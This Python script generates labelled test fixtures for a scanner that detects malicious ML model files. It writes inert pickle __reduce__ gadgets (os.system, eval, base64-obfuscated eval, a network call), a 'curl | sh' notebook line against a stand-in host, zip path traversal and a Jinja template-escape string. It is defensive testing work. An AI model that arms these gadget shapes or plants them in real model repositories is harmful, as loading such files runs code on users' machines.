#!/usr/bin/env python3
"""Build a labelled corpus of test artifacts for the scanner.

SAFETY NOTE
-----------
The "malicious" fixtures below are INERT. Every payload does exactly one
harmless thing: write a marker file into the fixture directory or echo a
string. They exist only so the detector can be proven to fire. Nothing here
is ever unpickled by the scanner or by these tests -- the scanner reads
opcodes, it does not execute them.

Do not commit these files to a repo that others might `torch.load`.
Keep the `DO_NOT_LOAD` prefix on generated directories.
"""
from __future__ import annotations

import json
import os
import pickle
import pickletools
import struct
import sys
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "fixtures"
MARKER = "mlscan_fixture_marker"

# Payload classes. __reduce__ is what pickle calls to serialize; whatever it
# returns is executed on load. This is the entire vulnerability.


class EchoPayload:
    """Classic os.system gadget. Payload is a harmless echo."""
    def __reduce__(self):
        return (os.system, (f"echo {MARKER}",))


class EvalPayload:
    def __reduce__(self):
        return (eval, ("1+1",))


class NestedPayload:
    """Staged payload: a pickle that unpickles another pickle."""
    def __reduce__(self):
        inner = pickle.dumps({"note": "inner payload"})
        return (pickle.loads, (inner,))


class NetworkPayload:
    def __reduce__(self):
        import urllib.request
        return (urllib.request.urlopen, ("http://127.0.0.1:9/",))


class ObfuscatedPayload:
    """base64 -> exec, the standard obfuscation shape."""
    def __reduce__(self):
        import base64
        blob = base64.b64encode(b"pass").decode()
        return (eval, (f"__import__('base64').b64decode('{blob}')",))


def w(path: Path, data: bytes) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


def make_benign_state_dict() -> dict:
    """A plausible-looking state dict using only allowlisted globals."""
    from collections import OrderedDict
    return OrderedDict([
        ("layer.0.weight", [[0.1, 0.2], [0.3, 0.4]]),
        ("layer.0.bias", [0.0, 0.0]),
        ("config", {"hidden": 2, "layers": 1}),
    ])


def torch_style_zip(path: Path, pickle_bytes: bytes, extra: dict[str, bytes] | None = None):
    """Mimic the layout torch.save produces: <name>/data.pkl + storage blobs."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", pickle_bytes)
        z.writestr("archive/version", "3\n")
        z.writestr("archive/data/0", os.urandom(256))
        for n, b in (extra or {}).items():
            z.writestr(n, b)


def make_safetensors(path: Path, tensors: dict[str, tuple[str, list[int]]],
                     corrupt_offsets: bool = False,
                     inconsistent_span: bool = False):
    """Minimal valid (or deliberately invalid) safetensors file."""
    header, cursor, blobs = {}, 0, []
    for name, (dtype, shape) in tensors.items():
        n = 1
        for s in shape:
            n *= s
        width = {"F32": 4, "F16": 2, "I64": 8}[dtype]
        nbytes = n * width
        header[name] = {"dtype": dtype, "shape": shape,
                        "data_offsets": [cursor, cursor + nbytes]}
        blobs.append(os.urandom(nbytes))
        cursor += nbytes
    if corrupt_offsets:
        k = next(iter(header))
        header[k]["data_offsets"] = [0, cursor + 10_000_000]
    if inconsistent_span:
        # Claim a huge shape while keeping a tiny data span.
        k = next(iter(header))
        header[k]["shape"] = [1000, 1000]
        header[k]["dtype"] = "F32"
        # leave data_offsets as the small real span
    header["__metadata__"] = {"format": "pt", "produced_by": "mlscan-fixture"}
    hb = json.dumps(header).encode()
    body = b"".join(blobs)
    w(path, struct.pack("<Q", len(hb)) + hb + body)


def build() -> None:
    if ROOT.exists():
        import shutil
        shutil.rmtree(ROOT)

    clean = ROOT / "clean-model"
    make_safetensors(clean / "model.safetensors",
                     {"encoder.weight": ("F32", [64, 64]),
                      "encoder.bias": ("F32", [64])})
    (clean / "config.json").write_text(json.dumps({
        "architectures": ["BertModel"], "hidden_size": 64,
        "model_type": "bert", "torch_dtype": "float32"}, indent=2))
    (clean / "tokenizer_config.json").write_text('{"model_max_length": 512}')
    (clean / "README.md").write_text("# Clean test model\nSafetensors only.\n")

    benign = ROOT / "benign-pickle-model"
    torch_style_zip(benign / "pytorch_model.bin",
                    pickle.dumps(make_benign_state_dict(), protocol=4))
    (benign / "config.json").write_text('{"model_type":"bert","architectures":["BertModel"]}')
    (benign / "README.md").write_text("# Benign pickle model\n")

    mal = ROOT / "DO_NOT_LOAD-os-system"
    torch_style_zip(mal / "pytorch_model.bin", pickle.dumps(EchoPayload(), protocol=4))
    (mal / "config.json").write_text('{"model_type":"gpt2"}')

    legacy = ROOT / "DO_NOT_LOAD-legacy-pickle"
    w(legacy / "model.pt", pickle.dumps(EvalPayload(), protocol=2))
    w(legacy / "nested.pkl", pickle.dumps(NestedPayload(), protocol=4))
    w(legacy / "network.pkl", pickle.dumps(NetworkPayload(), protocol=4))
    w(legacy / "obfuscated.pkl", pickle.dumps(ObfuscatedPayload(), protocol=4))

    rc = ROOT / "DO_NOT_LOAD-remote-code"
    make_safetensors(rc / "model.safetensors", {"w": ("F32", [8, 8])})
    (rc / "config.json").write_text(json.dumps({
        "model_type": "custom",
        "architectures": ["CustomModel"],
        "auto_map": {
            "AutoConfig": "configuration_custom.CustomConfig",
            "AutoModel": "modeling_custom.CustomModel"},
    }, indent=2))
    (rc / "modeling_custom.py").write_text(
        "import os, socket, base64\n"
        "import torch.nn as nn\n\n"
        "# module-level side effect: runs at import time\n"
        "os.environ['HF_HUB_OFFLINE'] = '0'\n"
        "_TELEMETRY = base64.b64decode('aHR0cDovL2V4YW1wbGUuaW52YWxpZA==')\n\n"
        "class CustomModel(nn.Module):\n"
        "    def __init__(self, config):\n"
        "        super().__init__()\n"
        "        os.system('echo mlscan_fixture_marker')\n"
        "        eval(compile('1+1', '<s>', 'eval'))\n")
    (rc / "configuration_custom.py").write_text(
        "class CustomConfig:\n    model_type = 'custom'\n")

    masq = ROOT / "DO_NOT_LOAD-masquerade"
    # a pickle wearing a .safetensors extension
    w(masq / "model.safetensors", pickle.dumps(EchoPayload(), protocol=4))
    # an ELF binary dropped in the repo
    w(masq / "libcustom.so", b"\x7fELF\x02\x01\x01\x00" + os.urandom(512))
    w(masq / "helper.sh", b"#!/bin/sh\necho mlscan_fixture_marker\n")
    (masq / "requirements.txt").write_text("torch\n--index-url http://pypi.invalid/simple\n")

    trav = ROOT / "DO_NOT_LOAD-zip-traversal"
    trav.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(trav / "weights.ckpt", "w") as z:
        z.writestr("archive/data.pkl", pickle.dumps(make_benign_state_dict()))
        z.writestr("../../../../tmp/mlscan_escape.txt", "escaped")
        z.writestr("archive/setup.py", "print('side effect')")

    bad = ROOT / "DO_NOT_LOAD-bad-safetensors"
    make_safetensors(bad / "model.safetensors", {"w": ("F32", [4, 4])},
                     corrupt_offsets=True)

    npy = ROOT / "DO_NOT_LOAD-npy-object"
    npy.mkdir(parents=True, exist_ok=True)
    header = "{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
    header = header + " " * ((64 - (10 + len(header)) % 64) % 64) + "\n"
    w(npy / "arr.npy", b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header))
      + header.encode() + pickle.dumps([1, 2, 3]))

    nb = ROOT / "DO_NOT_LOAD-notebook"
    nb.mkdir(parents=True, exist_ok=True)
    (nb / "demo.ipynb").write_text(json.dumps({
        "cells": [{"cell_type": "code", "source": [
            "!curl -s http://example.invalid/setup.sh | sh\n",
            "import os; os.system('echo mlscan_fixture_marker')\n"]}],
        "metadata": {}, "nbformat": 4, "nbformat_minor": 5}))

    keras = ROOT / "DO_NOT_LOAD-keras-custom"
    keras.mkdir(parents=True, exist_ok=True)
    cfg = {
        "class_name": "Functional",
        "config": {
            "layers": [{
                "class_name": "EvilLayer",
                "module": "attacker_pkg.layers",
                "registered_name": "EvilLayer",
                "config": {},
            }]
        },
    }
    with zipfile.ZipFile(keras / "model.keras", "w") as z:
        z.writestr("config.json", json.dumps(cfg))
        z.writestr("model.weights.h5", b"\x89HDF\r\n\x1a\n" + b"\x00" * 64)

    npz = ROOT / "DO_NOT_LOAD-npz-abuse"
    npz.mkdir(parents=True, exist_ok=True)
    npy_header = "{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
    npy_header = npy_header + " " * ((64 - (10 + len(npy_header)) % 64) % 64) + "\n"
    npy_blob = (b"\x93NUMPY\x01\x00" + struct.pack("<H", len(npy_header))
                + npy_header.encode() + pickle.dumps([1]))
    with zipfile.ZipFile(npz / "weights.npz", "w") as z:
        z.writestr("arr.npy", npy_blob)

    import gzip as _gzip
    gz = ROOT / "DO_NOT_LOAD-compressed-pickle"
    gz.mkdir(parents=True, exist_ok=True)
    w(gz / "model.joblib", _gzip.compress(pickle.dumps(EchoPayload(), protocol=4)))

    bad_span = ROOT / "DO_NOT_LOAD-stf-span"
    make_safetensors(bad_span / "model.safetensors", {"w": ("F32", [2, 2])},
                     inconsistent_span=True)

    tpl = ROOT / "DO_NOT_LOAD-template-config"
    tpl.mkdir(parents=True, exist_ok=True)
    make_safetensors(tpl / "model.safetensors", {"w": ("F32", [4, 4])})
    (tpl / "tokenizer_config.json").write_text(json.dumps({
        "chat_template": (
            "{{ ''.__class__.__mro__[1].__subclasses__() }}"
            "{% for m in messages %}{{ m.content }}{% endfor %}"
        ),
    }, indent=2))
    (tpl / "README.md").write_text("# template abuse fixture\n")

    lfs = ROOT / "DO_NOT_LOAD-lfs-pointer"
    lfs.mkdir(parents=True, exist_ok=True)
    (lfs / "model.safetensors").write_text(
        "version https://git-lfs.github.com/spec/v1\n"
        "oid sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
        "size 123456789\n")
    (lfs / "README.md").write_text("# lfs pointer fixture\n")

    app = ROOT / "DO_NOT_LOAD-appended-pickle"
    app.mkdir(parents=True, exist_ok=True)
    first = pickle.dumps({"a": 1}, protocol=4)
    second = pickle.dumps(EchoPayload(), protocol=4)
    w(app / "appended.pkl", first + second)

    print(f"fixtures written to {ROOT}")
    for p in sorted(ROOT.rglob("*")):
        if p.is_file():
            print(f"  {p.relative_to(ROOT)}  ({p.stat().st_size} B)")

if __name__ == "__main__":
    build()
